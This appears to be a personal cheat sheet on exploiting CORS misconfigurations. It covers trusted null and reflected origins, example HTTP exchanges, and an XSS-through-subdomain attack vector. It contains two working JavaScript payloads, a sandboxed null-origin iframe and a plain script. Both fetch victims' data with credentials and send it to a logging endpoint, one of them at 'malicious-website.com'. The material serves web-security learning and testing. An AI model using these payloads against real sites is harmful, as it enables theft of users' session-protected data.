### Look Out For Things that allow resource sharing from other sources…

Anything like:

`Access-Control` 

`Access-Control-Allow`

`Access-Control-Allow-Origin` 

`Access-Control-Allow-credentials`
_______________________________________________________________________________________________________________________________________________________________________
"Websites may trust null domains "
Origin: null

"Websites may trust unregistered domains that match the key words"
"Websites may trust expired domains"

`If a website trusts an origin that is vulnerable to cross-site scripting (XSS),
 then an attacker could exploit the XSS to inject some JavaScript that uses CORS 
 to retrieve sensitive information from the site that trusts the vulnerable application.`
_______________________________________________________________________________________________________________________________________________________________________
//Iframe with Null origin

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
_______________________________________________________________________________________________________________________________________________________________________

//HTML 
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','your.domain/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
_______________________________________________________________________________________________________________________________________________________________________
One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed. For example, consider an application that receives the following request:

GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
It then responds with:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
_______________________________________________________________________________________________________________________________________________________________________
Some applications might whitelist the null origin to support local development of the application. For example, suppose an application receives the following cross-origin request:

GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
And the server responds with:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
_______________________________________________________________________________________________________________________________________________________________________
ATTACK VECTOR
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
Cookie: sessionid=...
